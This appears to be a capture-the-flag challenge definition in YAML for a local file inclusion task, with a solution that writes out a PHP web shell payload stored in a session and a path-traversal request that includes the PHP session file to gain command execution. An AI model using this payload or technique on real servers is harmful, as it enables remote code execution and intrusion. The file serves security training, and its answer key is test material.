@@ -1,0 +1,12 @@
+---
+:description: |
+  "Find the local file inclusion. Start at /admin.php. Get a shell."
+
+:category: "Server_side_attacks"
+:name: "Local File Inclusion"
+:value: 100
+:keys:
+  - "TODO"
+
+:solutions:
+  - "1. save some shellcode in some answer to store in in your session, e.g.<?php echo shell_exec($_GET['cmd']); ?>\n2. POST /admin.php ... function=../../var/lib/php/sessions/sess_?????"
